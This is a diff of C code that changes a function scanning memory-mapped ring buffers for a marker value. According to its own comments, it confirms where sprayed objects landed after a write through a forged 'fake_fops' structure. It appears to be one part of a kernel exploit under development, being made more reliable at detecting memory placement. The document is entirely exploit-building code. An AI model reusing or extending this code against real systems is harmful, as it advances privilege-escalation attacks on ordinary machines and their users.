@@ -851,16 +851,25 @@ static void ring_map_register(unsigned char *p, size_t len) {
   }
 }
 
-/* Scan every registered ring at each 0x4000 slot for `value` at `off`
- * (off < 0x4000). Returns 1 when found (placement confirmed). */
+/* Scan every registered ring: search each 0x4000 slot's first 0x500
+ * bytes (the stamp region) for `value` at ANY qword offset — the walk's
+ * marker write (page+0x190 via fake_fops+0x90) must be found regardless
+ * of exact position. Returns 1 when found (placement confirmed). */
 int ring_registry_find(uint64_t value, unsigned off) {
+  (void)off;
   for (size_t m = 0; m < ring_map_cnt; m++) {
     unsigned char *p = ring_maps[m].ptr;
     size_t len = ring_maps[m].len;
-    for (size_t b = 0; b + 0x4000 <= len; b += 0x4000) {
-      if (b + off + 8 <= len &&
-          *(volatile uint64_t *)(p + b + off) == value)
-        return 1;
+    for (size_t b = 0; b + 0x4000 <= len || b < len; b += 0x4000) {
+      size_t end = b + 0x500;
+      if (end > len)
+        end = len;
+      for (size_t o = b; o + 8 <= end; o += 8) {
+        if (*(volatile uint64_t *)(p + o) == value)
+          return 1;
+      }
+      if (b + 0x4000 > len)
+        break;
     }
   }
   return 0;
